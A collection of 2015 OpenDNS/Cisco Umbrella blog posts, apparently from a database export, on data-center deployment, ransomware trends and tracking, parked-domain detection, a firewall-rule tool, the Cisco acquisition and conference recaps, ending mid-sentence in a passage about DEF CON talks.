More Internet users are going mobile as their primary choice of access. Cloud infrastructure is becoming astronomically more popular among developers and operations engineers. More services are offering APIs to connect to other services. And IoT is going to bring 50 billion devices online by 2020, according to Cisco. Just 10 years ago, the Internet had 1 billion users according to an Internet Society report released last year. Today, the same report estimates it is closer to 3 billion.\nAnd this growth is happening all prior to the majority of the world’s population even being connected to the Internet. A McKinsey report estimates as much as 60 percent of the world is not even online yet, putting the figure at 4.2 billion people without Internet access.\nAs the Internet’s growth progresses, interconnectivity becomes even more important. Many Internet users still do not fully understand how the network that provides their favorite services — like Snapchat messages, YouTube videos, or access to their bank — is largely a physical thing. The Internet in its most modern form is still thousands of miles of wrapped cable converging at certain geographical spots in the world to pass packets back and forth between companies, service providers, CDNs, and eventually to consumers.\nGetting Facebook, Pinterest, Instagram, and all the other tech giants, connected physically is not an easy task. The same goes for providing an Internet-based security service.\nIn April of this year, OpenDNS opened a new data center in Johannesburg, South Africa. The location addition means providing companies and customers with a connection point in Africa, rather than routing traffic through Europe. As a result, OpenDNS engineers estimated the subsequent latency improved from a few hundred milliseconds, to just a few milliseconds RTT.\nMuch like launching a new UX project or developing a new app, the launch was a culmination of immense pre-work. OpenDNS Engineering Manager Jennifer Basalone says this process is always how it goes with establishing data centers. Having set up five data centers for OpenDNS, and building on experience doing the same work at Facebook, Basalone is more than well versed with the whole process.\nBefore a company can just drop a router into an Internet exchange (IX) and start peering with other companies to deliver service, a lot of vetting, research, and negotiation needs to be finished. Basalone outlined it into six major steps — all of which could of course be broken out into dozens of sub-steps.\n1. Find a good IX\nAccording to Basalone, it’s not quite like throwing a dart at a map of the globe. There are many considerations involved, like costs of operation, deployment issues, legal and tax considerations, allowance for private peering, security needs, data handling needs, the type of peers available in the IX, and quite a few others. Mainly, the goal is to find an IX with good neighbors so you can get customers closest to the providers of content they want.\nA map of Internet exchange locations from datacentermap.com\n2. Find what data center hosts that IX\nThis step is fairly straightforward, and will set the base for the needed research that follows.\n3. Research the costs\nA country’s stability, tax laws, and data privacy laws — among others — are all under consideration. The goal here is to “make sure [the targeted country] is not a US embargoed country,” Basalone said. “Then you really want to make sure the country is stable. And then look at the taxes that are involved.”\nNow is also a good time to start looking at arbitration and service level agreements from the various providers involved to answer fundamental questions. For instance, can the data center provide the amount of power required to host enough servers and routers? Can it handle the amount of estimated traffic? Is there staff ready and available to help with outages 24/7?\nEach country is different, and each country carries its own challenges. Brazil, for instance — a country OpenDNS does not currently operate in — reportedly has some fairly challenging import laws and taxes, being a country that likes to encourage as much local business as possible. Along with country-specific taxes and the cost of the actual equipment, there are import fees, monthly management costs, port and airport taxes, regional taxes. The list is extensive, Basalone said.\n4. Pre-configure equipment and ship\nOnce all the costs are estimated, space is planned out, and a service agreement is vetted by legal and signed by both parties, it’s time to prep the equipment. Each router, switch or whatever other box required, needs to be booted, configured, and ready to ship out to location.\nOnce shipped, things can sometimes get complicated. The longer equipment takes to ship, or is stuck in customs, for example, the more security becomes a concern. “You can have equipment stuck in customs for 100 to 200 days, and not know when it will come out,” Basalone said. “Companies will sometimes even do three separate shipments and hope one makes it. The longer time it is en route, the higher chance it has of being stolen.”\n5. Go Live\nOnce all the equipment has (hopefully) arrived safely, having gotten through complex customs laws, it’s time to send someone out to stack, rack, and bring it all online. But even then, it’s still not entirely a sure thing that the process will go smoothly. “Even if all the shipping and equipment setup works, nothing is going to come online until the transit provider comes online,” Basalone said.\nEven choosing a transit provider alone can come with many considerations and sticking points.\nFor Basalone and her team, a data center go live date is a stressful and exciting time. It typically involves multiple engineers from different teams and locations, all working together to create an entirely new connection across the globe. “We all get together and sit in a chat room,” Basalone said. “And the network team lets us know our transit providers are online. Then we can bring our servers online.”\nAs far as the tools of the trade, Basalone’s team uses a host of them. “Our engineers use a wide variety of tools like Ansible, Puppet, NetHarbour, custom automation, and other provisioning support systems to automate as much of the build as possible,” she said.\n6. Announce to the world\n“Once everything is online, looks good, and everything’s a go, we request our awesome network engineering team enable anycast for the site,” she said. “At that point our anycast routes are announced in BGP from the new location and traffic will start flowing to our new data center.”\nAlong all six of these “simple” steps are minefields of issues that can cause the process to halt, or at least delay. Basalone said that is the number one thing her team tries to avoid when getting a data center live.\n“Bringing up the site takes a couple of teams, so you don’t want to waste their time,” she said. “Having everything set up and well coordinated makes the process go a lot smoother.”\nSound pretty easy? Didn’t think so.\nTo learn more about OpenDNS’s engineering team and its progress, visit their blog here.', 'BGP;Blog;News', 'https://umbrella.cisco.com/blog/2015/09/09/setting-up-a-global-cloud-infrastructure-in-six-easy-steps/');

The scenario goes, while using a device or laptop like normal to browse or e-mail or hunt for videos, a sudden message pops up like the one pictured. Now irreplaceable family photos, music files, work documents, tax returns, or any data of value are all inaccessible — unless you pay, of course.\nAn example of a CTB Ransomware demand pop up.\nAs far as cyberattacks go, ransomware is one of the most straightforward in terms of end goal. After an initial compromise — usually through a phishing attempt — the malware infection sits quietly, evading antivirus and malware detection, and sends confirmation to a far-off controller that it has successfully infected a host. Then it gets instruction to lock the device or encrypt files and display a message demanding payment.\nFor now ransomware is only affecting computers. Attackers are largely indiscriminate when picking a target, home machine or office laptop, doesn’t make a difference as long as someone pays. But according to some, there is a real possibility that ransomware model will move to other devices and internet-connected appliances, or even automobiles. Imagine hopping into your car late for the morning commute when up pops a message on the nav screen that it won’t drive until a random e-mail address gets a payment of $250 in Bitcoin.\nJust days ago, McAfee released a report citing a 58 percent growth in ransomware in Q2 alone. The accelerated growth is attributable to two main causes. First, attacks are cheaper and easier than ever to run. The availability of as-a-service malware options on public Github with helpful YouTube demos lowers the technical bar significantly. And second, those infected by ransomware campaigns seem willing to pay often enough that ransomware continues to be an enticing scheme. The money, according to most estimates, is really good.\nMcAfee’s security report shows the growth of ransomware quarter over quarter. Graphic: McAfee, Inc.\nOpenDNS Security Researcher Kevin Bottomley demonstrated at BSSides SF earlier this year just how easy and cheap it is to set up a phishing site that spoofs a real login page and looks strikingly legitimate. And in a blog post last month, he laid out the various flavors of ransomware one can encounter regularly. With a cheap phishing site and easy access to malware tools, it’s easier than ever to begin a campaign.\nAs for mitigating ransomware, it can often depend on the type of infection. “It should be noted that not all ransomware is created equal,” Bottomley wrote, “nor do they all act in the same way, but they all tend to leave (for the most part) a footprint that can be used to track and locate where it lives on the Internet.” This footprint means it could be possible to trace where attacks originate and block the related offending IP spaces and hostnames before they infect other users.\nProtecting PCs individually is more straightforward, for now. A mid-year security report from Cisco security researchers suggests backups as the most effective way of protecting your data. Once files are encrypted by ransomware, be it work spreadsheets or family photos, the data can be nearly impossible to decrypt without a decryption key, which might mean losing it forever. Wiping and restoring is therefore an exercise that might become much more prevalent as a result.\n“Users can protect themselves from ransomware by backing up their most valuable files,” the Cisco report authors wrote. “Users should also realize that their system could be at risk even after they pay a ransom and decrypt their files.”\nThere are other suggestions for protecting against ransomware attacks including endpoint protection, monitoring network traffic, end-user awareness training for phishing, and others. But the best way to not fear losing data, is knowing you can get it back. Like Jon Jacobi wrote in a simple, useful guide to backing up for PCWorld, it’s best to start backing up now. Yes, now.\nTo test your knowledge of phishing, try our online phishing quiz. If your score is low, it might be time to get some training\nWhat are your ransomware suggestions?

Some parked domains serve custom 404 pages, redirects, or advertisements.\nParked domains often serve ads to visitors as a mechanism for generating revenue for the domain owner. As more visits translate to more ad impressions and more ad impressions translate to more money for the domain owner, parked domains meant for monetization often use tricks to increase traffic volumes. These tricks include typo squatting, SEO trickery and search term mining, as well as name “guesses” (e.g. is a user is looking for spare car parts, they may type “carparts.example.com” into their browser).\nHow to Determine If a Domain Name is Parked\nThere are a few methods of identifying if a domain is parked or not. As Dhia Mahjoub pointed out previously, comparing the resolution between the domain name and a random subdomain can be used to determine if a single domain name is parked or not. Comparing the content served back from the server with varying HTTP referer headers is another way as parked domains often tailor ad content based on search engine queries. For example, if you end up visiting a parked domain and the referer is from a Google search for puppies, the ads on the parked domain may be for things like dog food or dog toys.\nAnother indicator of a single domain being parked is how many other domains are also resolving to the IP address that name resolves to. A large amount of domain names resolving to a single IPv4 address often indicates a parking IP or a shared hosting provider. This technique makes use of passive DNS data. Another technique which uses passive DNS data is to look at the number of domains the name servers of the domain in question are authoritative for. Name servers which have been delegated a large number of domain names (something like 15,000 or more) are often authorities for parked domains. Lastly, looking at the number of third party locations referenced in the source of the HTML served back from the domain is another indicator. As parked domains contain mostly dynamically loaded advertisements.\nRecently a paper was published at the 2015 Network and Distributed System Security (NDSS) Symposium which outlined ways of identifying parked domains based on DNS records and HTTP content. The paper is a very good read and the accompanying Github is fantastic. We on the research team have adapted some of the techniques used in this paper to classify parked domains.\nNotes of Interest\nWhile exploring the techniques used in the paper previously mentioned, we came up with a novel mechanisms for comparing two domain’s HTML content. Using RabbitMQ, Celery, and Flask we built a basic web service which would render a page using PhantomJS and return the HTML as a string. Using the html parsing code from Python’s lxml module we created a tree of the HTML elements; this is essentially a DOM tree. We then converted the DOM tree to a networkx graph and used matplotlib to visualize the tree. We also converted the DOM tree to a graph specific to the zss module which implements the Zhang Shasha algorithm. Doing so for two different domain names allows us to calculate a tree edit distance (similar to a string edit distance) between the two DOMs.\nHere is a script which reads HTML from files (of full saved web pages) and does the comparison.\nBelow are some interesting images showing the DOM structure of three parked domain names who had a very similar DOM tree regardless of the content on the page (as dynamically served ads often change on each page load).\n\n\n\nThe same 3 domains can also be viewed within OpenDNS Investigate. The following WHOIS information shows us all registrant and nameserver history for each domain:\nBTCCLASSIFIED.COM\n\nDUKUNMP3.COM\n\nFILMESADVANCED.COM\n\nAnd confirms the parking location at Bodis – a known parking provider.\n\nBelow are two images showing the DOM trees of Google searches. They too are very similar to each other because the actual content of the pages is irrelevant.\n\n\nWhat is the Impact of Parked Domains to Your Network?\nThere is no legitimate reason for anyone to visit a parked domain. By definition, parked domains serve back useless content. Additionally, the strong focus on dynamically serving ads to browsers make parked domains a great vehicle for malvertising. We’ve also noticed many of the domain shadowing names Angler EK have repurposed in the past were originally parked.\nComparing DOM trees is a very telling method of grouping like HTML content together. As parked domains often reuse a set of templates for displaying advertisements to users comparing DOM trees eliminates any noise the ads may introduce when comparing HTML source of two web pages.', 'Incident Response;Security Graph;Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2015/09/01/the-good-the-bad-and-the-parked/');

In a nutshell, it does three things:\nConfigures and enables logging of all inbound and outbound connection attempts (by default it looks for TCP SYN packets).\nGenerates a report showing the IPs and services of the peers the host is communicating with.\nGenerates iptables rules for each connection type.\n\nMotivation\nLet’s start with a quick example:\nYou have a fresh host for your new project and want to “lock it down.” You know it needs to talk to your database server and a few backend services, and that it will need inbound access from admins over SSH, plus web access for your clients. Writing the rules is not very easy either, but there are a few good tools out there for helping with that. You finalize your ruleset and put them in place. Everything works good for a few days, until your users can’t login because you forgot to enable access to your NTP (time) server, and the auth components need to stay in sync with time!\nThis is just one simple example, but the big picture is that in today’s fast-paced development world, where we’re building widgets using libraries built on top of other libraries, we don’t always know what our dependency chains looks like. This can make whitelisting for security difficult, and sometimes a bit scary, as we want to do the right thing but not break anything.\n\nHow TrafficCop Helps\nLet’s redo our example. This time we configure Traffic cop to log all connections on our server in a development/test environment (you probably don’t want to experiment in production). We let it run for a few days to get a good sense of the traffic. At the end of the learning phase, we’ve captured a rough baseline for the host. We review the rules it generated, select the ones that make sense, tweak the IP ranges as we see fit, and put them in place.\nNote that we’re not just talking about inbound firewall rules here. We’re putting outbound rules in place too. This is traditionally an uncommon practice on host-based firewalls, as outbound traffic is typically more painful to classify and understand per application, but we’re using live data to drive the configuration, therefore we can take advantage of outbound traffic filtering. A blanket allowance of outbound traffic is one of the big drivers for malware to be primarily outbound focused (connecting back to “the mothership”), rather than attempting to communicate with the target inbound.\n\nDemo Time!\nWe spin up a fresh EC2 instance, in a public subnet, using the default security groups (allows port 22 inbound from anywhere and all outbound).\n\nSSH into the instance:\n$ ./tcop enable\n$ curl google.com (to show outbound log)\n(waited about 5 minutes)\n$ ./tcop report\n\n\nThat first inbound IP is us logging into the instance. The others are not! Notice that within just a few minutes we’re already getting IPs from around the world hitting our SSH port.\n\nGreat, How do I get Started?\nHead over to the GitHub page for instructions on setting it up and generating reports.

In 2006, the company was launched as a consumer DNS provider. In 2012, the company transitioned to cybersecurity with the release of the Umbrella network security service. Two years later, OpenDNS announced partnerships with some of the biggest IT security vendors in the world. Next, 2015 saw a new set of APIs that allow any customer to integrate any security product with OpenDNS’s global security network. The latest change came on June 30th, when Cisco Systems announced its intent to acquire the company.\n\nToday officially marks not only the close of the acquisition, but also the first milestone in our joint efforts to accelerate Cisco’s cloud-delivered security portfolio.\nOpenDNS, now part of Cisco\nFrom the beginning, the partnership between OpenDNS and Cisco has been cited by the press and industry analysts as one that matches the future priorities of a dominant IT powerhouse with the core competencies of a growing, innovative cloud security company.\nIn a special report on Cisco’s security acquisitions, Forrester Research analyst Rick Holland wrote that the OpenDNS acquisition “… upgrades Cisco’s cloud-based security offerings and provides valuable DNS-based threat data.” In a report about Cisco’s recent spate of cybersecurity acquisitions (Brief: Cisco Continues Its Blistering Security Acquisition Pace With The Addition Of OpenDNS, Forrester Research, August 6, 2015), Holland called OpenDNS “… a powerful software-as-a-service (SaaS) security offering, a platform to provide IoT security, a force multiplier for security controls, and powerful threat data for both enrichment and proactive protection.” Holland also pointed out that Cisco is committed to its vision of providing security everywhere and solutions across the extended network.\nHilton Romanski, SVP, Chief Strategy Officer at Cisco said in a blog post that the acquisition of OpenDNS helps Cisco grow in two areas: building on the advanced threat detection capabilities already in Cisco’s portfolio and transitioning to a bigger focus on cloud-based cybersecurity solutions.\n“To build on Cisco’s advanced threat protection capabilities, we plan to continue to innovate a cloud delivered Security platform integrating OpenDNS’ key capabilities to accelerate that work. Over time, we will look to unite our cloud-delivered solutions, enhancing Cisco’s advanced threat protection capabilities across the full attack continuum—before, during and after an attack.”\nStacey Higginbotham at Fortune called OpenDNS’s Umbrella offering an “essential service” that will blend well with Cisco’s own network focus and provide a new capability for managing a growing number of security threats.\nStories about the planned acquisition consistently focused on the idea that there is significant potential for OpenDNS and Cisco to build integrated security solutions that, someday, will provide customers with services that are more powerful than the sum of their parts.\nThe Future of Cloud Security, Now\n“Someday,” it seems, is today and that “potential” is now a reality. Announced earlier this morning in a press release on Cisco’s website, OpenDNS has integrated the Cisco AMP Threat Grid malware analysis cloud service with OpenDNS Umbrella. This first integration gives customers of both services the ability to add new malware domains discovered by Threat Grid directly to customers’ Umbrella block lists.\nThe Cisco AMP Threat Grid cloud service securely sources malware from a closed community and analyzes these samples using proprietary techniques that include static and dynamic analysis. Unlike traditional sandboxing technologies, this dynamic malware analysis exists outside of a virtual environment and identifies malicious code that has been designed to evade analysis.\nThis new integration between cloud services provides OpenDNS users with a constantly updated list of the newly identified malicious domains from the latest malware samples available. When a customer sends files to AMP Threat Grid, malicious domains will be automatically added to OpenDNS Umbrella in minutes, with no user interaction. Umbrella will log or block all Internet activity, including data exfiltration, destined to these domains on any device — on or off the corporate network.\nOpenDNS — Security Everywhere\nWhat made this integration possible is something that’s been part of OpenDNS’s company DNA from the start: building a strong foundation for cloud computing. From the ability to quickly design, test and deliver innovative services to its customers over a global cloud network to developing carefully tested APIs that allow any service to integrate with OpenDNS Umbrella, the speed with which the AMP Threat Grid integration was executed demonstrates the value of the OpenDNS vision and the work that has been done by OpenDNS’s engineering team throughout its history. This latest integration is also an example of the platform’s continued ability to move quickly and adapt to a changing security landscape.\nAs the transition plan continues to develop over the coming months, it’s clear that as part of Cisco, the OpenDNS team will continue pushing forward into the future, full-steam ahead.\nTo learn more about how OpenDNS builds on Cisco’s “Security Everywhere” vision, join our webcast on Thursday, September 3rd at 10 a.m. PDT/1 p.m. EDT with David Ulevitch, founder of OpenDNS (and newly appointed Cisco Security Business Group Vice President), and Scott Harrell, Vice President of Product Management, Cisco Security Business Group.', 'Announcements;Blog', 'https://umbrella.cisco.com/blog/2015/08/27/cisco-and-opendns-cloud-security/');

The project, called the Threat Intelligence Database (IntelDB), is a graph database system that captures and stores all security-related data for our entire organization. The IntelDB collects data from research and based on relationships between nodes in the IntelDB graph, supplies intelligent security decisions to our products, enabling it to serve as an authoritative source for data such as whitelisting and threat attribution. In addition, our researchers are able to leverage this data source to conduct research faster and with more confidence. The recorded session can be viewed below:\n\n\nInsights from Dhia Mahjoub\nBlack Hat hosted many inspiring and technically engaging talks worth attending. In her keynote “The lifecycle of a revolution,” Jennifer Granick reflected on the driving principles of the past 20 years that shaped the Internet of today. Internet users aspired to a world not confined by age, race, gender or stifling laws. Furthermore, and based on the current trends, Granick painted a poignant picture of what the Internet would be in the next two decades. “The freedom to tinker” she argued is a fundamental right that we should dearly preserve. The video of the talk is available here.\nThen, Joshua Saxe hosted a session titled “Why Security Data Science Matters and How Its Different: Pitfalls and Promises of Data Science Based Breach Detection and Threat Intelligence.” Saxe gave an edifying talk about the experience of his research team in applying machine learning and visualization in malware detection. He pointed out that applying ML in security presents different challenges and seeks different goals than in other fields like social media, speech or image recognition.\nFor example, in security:\n– Data science models need to deal with the presence of an adversary where attackers are deliberately trying to evade detection systems.\n– False positive rates should be lower than in other disciplines.\n– There is a need of interoperability in the sense that correct detection is only part of the story, the model should also provide context. In this case, presentation is often as important as the model accuracy, because that means people can actually use the results, hence the advantage of visualization.\n– There is an absence or lower volume of accurately labeled data compared to other disciplines.\nIn threat detection patterns are constantly changing and evolving since, as mentioned above, adversaries strive to always have high evasion rates. This talk specifically struck a chord because it reinforced the ideas and principles that make up much of our daily routine at OpenDNS Security Labs.\nFinally, Michael Ossmann gave an intriguing update in his session titled “The NSA Playset: A Year of Toys and Tools,” built as part of the NSA Playset project. The project was started last year as an inspiration from the contents of the leaked NSA ANT catalog.\nInsights from Andree Toonk\nBGP was a hot topic this year at Black Hat. It’s great to see this is now on the radar of security practitioners worldwide. Andree attended two BGP briefings on Wednesday, both were a good summary of the current state of BGP security and the potential for misuse either intentionally or by accident.\nOn Thursday Andree presented OpenDNS’ BGPStream work with CTO Dan Hubbard. During the presentation OpenDNS officially released the bgpstream.com website and @bgpstream & @dnsstream Twitter feeds. The presentation was well attended and received lots of excellent questions from the audience about recent BGP incidents and RPKI.\nAndree notes that it was great to work with a diverse team of developers at OpenDNS on the project. The goal for Andree and Dan was to develop a system that publishes a stream of BGP and DNS events via Twitter and to the BGPStream website. Andree especially enjoyed being able to combine different data sources such as DNS, BGP, Netflow, visualize them and allow users to re-play the event on the BGPStream website. The tweet below is an example of one of the recent large scale outages in Iraq.\nOr this example, which highlights the hijack of one of the United States Marine Corps prefixes by a providers in Venezuela. We’re super excited to see the unique end-result and we’ll continue our work on these tools to make it even more useful.\n\nInsights from Anthony Kasza\nAnthony attended both Black hat and Defcon and had the opportunity to attend several talks. “The Bieber Project” was a session by Mark Ryan Talabis, the Chief Security Scientist at zVelo, discussing the basics of the Internet’s advertising ecosystem and highlighted different methods of purchasing fraudulent traffic. Fraudsters often are able to profit off the spread between the gains of displaying impressions (ads) on a site and the cost of purchasing traffic sources for the impressions. He also discussed the differences between the quality of traffic and heuristics used to determine fraudulent (bots) from real (humans) traffic sources.\nTalabis highlighted a very interesting Chinese traffic generator named JingLing. Similar to peer-to-peer file sharing, JingLing operates as an opt-in distributed traffic exchange. A user enters a page they would like to send traffic to and the URL is distributed to other JingLing users, who then generate traffic toward that URL. JingLing then receives sites from other JingLing users and visits those sites. What’s interesting is the way the traffic is generated. JingLing traffic looks very similar to the default browser installed on the end user’s system. This makes it much more difficult for ad exchanges to detect the fraudulent traffic. For example, techniques like checking to see if the browser has plugins installed cease being effective.\nInsights from Kevin Bottomley\nOf the talks and villages Kevin attended that really drew his attention was on Friday simply dubbed, “Hacking the Tesla Model S,” presented by Marc Rogers and Kevin Mahaffey. As the name implies, the researchers dissected the inner workings of a $100,000 automobile to show that it was possible, even on a automobile system that had been designed with security at the forefront. One of the major differences between hacking the Model S, and a previous publicized automobile hack, was that the researchers needed physical access to exploit the system.\nThe pair spent the better part of the talk explaining the issues they ran into along the way, and how in the end they basically used tape and an Ethernet cable to get access to the internal workings of the system, as Tesla had already applied several patches to known vulnerabilities, including to the Qt WebKit browser. The researchers were able to spoof a connection to a Tesla service center, which the car automatically connects to when in range, and, by doing this, were able to control the starting and stopping of the vehicle, door locks, and the entertainment system. While this may not have been a all-in-one take-over of the vehicle, it does show that even vehicles with a security-first approach are still susceptible to compromise.\nInsights from Thibault Reuille\nFrom the large quantity of talks at Defcon 23 this year, a couple of talks really caught Thibault’s attention, most notably for their originality and quality of the content.\nThe first one was “How to Hack a Tesla Model S” presented by Marc Rogers (CloudFlare) and Kevin Mahaffey (Lookout, Inc.). The two unveiled many aspects of the car telemetry system and exposed a few ways to hack it. This presentation was truly interesting because in that it raised critical security concerns as the new generation of highly connected cars emerges in the IoT landscape.\nThibault also attended a talk titled “Detecting Randomly Generated Strings; A Language Based Approach” by Mahdi Namazifar of the Talos Team at Cisco Systems. Obviously, DGA domain analysis is important at OpenDNS, and the comparison of different approaches to the same problem is truly interesting.\nFinally, Thibault enjoyed the Q&A session with Bruce Schneier. It was a high-level view of the modern security world and the one we are going to experience tomorrow. As usual, Schneier delivered insights and answered questions brillantly. From biometric passports to voting machines, and protection of privacy to core elements of state-of-the-art cryptography. It was a true eye-opening and lively session.\nInsights from Andrew Hay\n\nThe team wrapped up a successful week at Black Hat 2015 where we had a huge number of security professionals stop by our booth, talk with our team, and learn about our products and research. Many visitors also snagged one of our fantastic, limited edition GameOver Zeus T-shirts.\n\nA new addition this year, our VIP limo drove more than 250 people between the airport and the venue. If you were lucky enough to fly in at 8am on Wednesday, you probably had the chance to to talk to Andrew Hay and OpenDNS Social Manager, Kara Drapala. The limo gave Kara and Andrew a great opportunity for conversations with other security professionals, including suggestions on which sessions to look forward to — and perhaps more importantly, what parties to attend.\n\nAs is typical of security conferences, there was no shortage of vendor sponsored events to attend. Andrew split his time between OpenDNS held events, such as the OpenDNS customer dinner — his only sit down dinner of the week — and other events like the Talos Researcher Party, which was a wonderful chance for the OpenDNS Security Labs team to casually chat with some soon-to-be peers on the Cisco side. A few people from the team also attended the Urbane Security party and the Nike party on the Wednesday night — with one being small, intimate, low key, and related to security… and the other being the Nike party.\nOn a related note, Andrew quickly learned that he is not young anymore.\nIn Closing…\nAnother Las Vegas Security Summer Camp completed. Next year OpenDNS will be part of the Cisco family so the traffic to the booth, scheduled meetings, and organized formal events will grow exponentially. We can’t help but smile when we think about the types of talks that we can submit to all three conferences next year with our new research peers.\nExpect great things!', 'Events;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2015/08/24/bsides-las-vegas-black-hat-and-defcon-wrap-up/');

Currently it seems to be the malware-de-jour. It should be noted that not all ransomware is created equal, nor do they all act in the same way, but they all tend to leave (for the most part) a bit of a footprint that can be used to track and locate where it currently lives on the Internet. Gathering steam a few years ago, ransomware used to work by installing itself, rebooting the system, and displaying an image similar to this one:\n\n(image courtesy of bleepingcomputer.com)\n\nScary tactic right? While it might have been frightening to some, all was not really as bad as it appeared to be. It’s unknown how many people actually payed the ransom for this campaign, but one can assume there were quite a few. The simplest way to circumvent this lock down was to boot into safe mode, and clean up the infection using any one of various means.\nHowever, as time moved forward, and the income from some of the bigger pharma schemes (real money makers at the time) started to falter, nefarious actors started to work on new and better means to generate revenue. The next real advancement in the ransomware family came in the form of CryptoLocker. CryptoLocker was dispersed through malicious email attachments by the Gameover Zeus (G0Z) botnet and used RSA public-key encryption to make files(both locally and on mapped drives) impossible to use unless a ransom was paid in the form of Bitcoin or pre-paid cards, which usually cost about $300- $500 USD/Euro.\nCryptoLocker\nCryptoLocker left a footprint in the way of using a Domain Generated Algorithm (DGA). This DGA was used so that it would produce thousands of domains at a time, with only a couple or so of the domains actually being live. This tactic was used to make locating the Command & Control servers harder for researchers and law enforcement. Yet, once a sample was able to be reversed, and the seed (a seed is what is used to produce the DGA, usually based on a time/date schema) was found, it was easy to determine which domains would be generated in forthcoming days and weeks, and one could block these domains from the network even before they had a chance to become live (something OpenDNS did with great success).\nWith the take down of GoZ in mid-2014, this also helped eradicate CryptoLocker greatly, yet, this would not be the end of ransomware. In all reality, there have been many competitors entering the ring, as well as a couple that have been around for a while. These include:\nAlpha Crypt\nAzazel Locker\nBitCrypt\nCRYPVAULT\nCTB-Locker\nCoinVault\nCryptoLocker 2.0\nCryptoLocker 3.0\nCryptoWall\nCryptoWall 2.0\nCryptoWall 3.0 (Cowti)\nCryptodefense\nHarasom.A\nHowDecrypt (Cryptorbit)\nPrisonLocker (PowerLocker)\nRansomcrypt\nReveton\nTeslacrypt\nTorrentLocker\nWhile some of these used the CryptoLocker name, they were mostly just the same in that way only. Most of these copycat versions used either much weaker encryption processes, or made the mistake of leaving the keys easily recoverable. Yet, for every one that didn’t play up to par, there were a couple that stick out.\nTorrentLocker\nThis particular ransomware used geo-location based services to target individuals in only a certain parts of the world. While it was seen quite largely in the Australian and New Zealand areas, with some European countries included as well, there was little to no sign of it being used in the United States. The delivery mechanism mostly centered around use of email that referred to messages about unpaid invoices, traffic citations, or missed deliveries. Once opened, there were usually one of two paths taken. There would either be a malicious .zip file attached, or there would be a link to a web site where the user had to complete a captcha. These sites usually were in the form of *(aus|nsw)-(post|gov).(top-level domain), with some minor variations along the way. This format made the tracking of these domains a bit easier, as just about any domain that was seen in that format proved to be malicious and provided little difficulty in figuring out what the next domains that could prove to be malicious in the future might be. The below screenshot from Investigate shows that database-nsw-gov.net is blocked by OpenDNS. This particular domain was blocked in February of 2015, when it was fairly active, and still shows continued activity today:\n\nTesla/AlphaCrypt\nThis particular variant has a couple of names, but was really the same ransomware, just renamed from TeslaCrypt over to AlphaCrypt. The format AlphaCrypt uses for it’s domains also comes to us in the form of a DGA. An example of the domains tends to look like fsoreij38wje2d.fkos650er4wf[.]com, where there is a both a domain and sub-domain that are both in the form of nonsensical patterns. These tend to be easy to spot using algorithms based on lexical analysis. This particular domain was blocked by OpenDNS back in May of 2015 after being spotted by the aforementioned algorithm.\n\nCryptoWall\nCryptoWall is probably the most formidable runner-up for taking over the legacy CryptoLocker left behind. Unlike CryptoLocker, CryptoWall, and its newer versions 2.0 and 3.0, came out of the gate swinging in late 2014. Also unlike it’s predecessor, CryptoWall did not implement the use of DGA’s, but instead used a combination of compromised sites, TOR (The Onion Router) and I2P (Invisible Internet Project). Throughout the renditions of the malware, it morphed from exploiting the system itself using various vulnerabilities, to employing the use of Exploit Kits, most recently, and noticeably, the use of the Angler Exploit Kit to drop the malware. There are a couple of ways that can be used to track down CryptoWall. Without getting into to much detail, for what I hope are obvious reasons, we can take a look at some of the simpler ones.\n(CryptoWall decryption instructions. Image courtesy of bleepingcomputer.com)\nWhat we can look at first though, is the use of Angler. Angler currently uses an evasion technique where nefarious actors compromise legitimate registrant accounts, and create a rotating set of sub-domains appended to the legitimate domains (2LDs). These sub-domains generally point to a completely different location (IP, ASN, Registrar, etc) that is hosting the Exploit kit landing page. Our research team covered this trend at BSides Raleigh 2013 and wrote a blog with more details in 2014, and we subsequently discussed this technique at BlackHat, Def Con, and Virus Bulletin of last year. In March of this year, Cisco put out a blog and called the technique ‘Domain Shadowing’. By looking for this Indicators of Compromise, one can start to access which domains have been taken over, and blocked quickly. Yet, one can not rely on the use of Angler alone, albeit a good indicator. CryptoWall tends to make use of compromised domains, and has largely been seen to use outdated WordPress plugins to compromise the legitimate domains (this is not the only way, but is one of the most seen). We can also look for related domains that are associated, that is, domains that are requested in rapid succession to known bad domains, and start to pivot around off of those to find other CryptoWall domains. Attempting to pattern match against requested URL’s is yet another way, but these can change often and rapidly and does not appear to give the same consistent results.\nThe more that malware develops and morphs, the more that detection and prevention has to change. With the high profile of ransomware, and it’s ever continuing transformations, researchers will always be nose to the ground to be out in front of these changes. OpenDNS is committed to this process, and is always striving to improve and revise its procedures and methods to stay one step ahead of these threats.', 'Malware;Security Research', 'https://umbrella.cisco.com/blog/2015/08/20/tracking-the-footprints-of-ransomware/');

Although the topics of presentations at these events vary wildly, there are some connecting threads — issues so universal that everyone wants to hear about them.\nThis year, those particular subjects were not surprising. Given the rise of BGP hijacking incidents, the revelation of Charlie Miller and Chris Valasek’s Jeep hack, and the proliferation of old-school attacks, it was easy to guess which sessions would have lines out the door.\nBGP is the New Black\nMove over SSL/SSH/TCP/BBQ, everyone in Vegas wanted to talk about the newfound protocol celebrity, BGP. (For a thorough explanation of BGP, and how it relates to security, see our explainer here.) Three talks at Blackhat highlighted an increased industry awareness of the security threat posed by BGP attacks. First, Wim Remes of Rapid7 provided an overview of BGP, and focused on increasing trust to prevent systemic routing abuse.\nRemes was followed by Artyom Gavrichenkov of Qrator Labs, who took a more practical approach by showing how an attacker could execute a BGP hijack. His suggestions for mitigation included increased monitoring of BGP, as well as an industry-wide commitment to fixing the problem.\nSpeaking of monitoring, the final BGP presentation of the conference came from Dan Hubbard and Andree Toonk of OpenDNS. The pair also spoke on the problem of BGP hijacking, and officially unveiled BGP Stream, a live Twitter feed that will use data collected from BGPMon — a BGP monitoring service purchased by OpenDNS this year — to announce suspicious BGP activity, from hijacks to large-scale outages. They then went a step further and announced a companion feed, DNS Stream, which will announce DNS incidents.\nThe Internet of Things…Specifically, Your Car\nAs OpenDNS reported recently, the Internet of Things is less than adequately secured. This year in Vegas, one of the most popular talks was Chris Valasek and Charlie Miller’s session(s) on hacking a Jeep. The pair, researchers from IOActive and Twitter respectively, entertainingly walked the audience through their process in attacking the Internet-connected vehicle via the head unit, or in-dash portal.\nAt DEF CON, Marc Rodgers of Cloudflare and Kevin Mahaffey of Lookout presented their research on hacking a Tesla Model S — including the release of a tool that allows Tesla owners to view the telemetry data from their own vehicles. The conference also allocated a generous amount of space in the middle of the contest area to the vehicles in question, allowing attendees to get up close and personal with both a Tesla Model S and Jeep Cherokee. Also at DEF CON, Runa 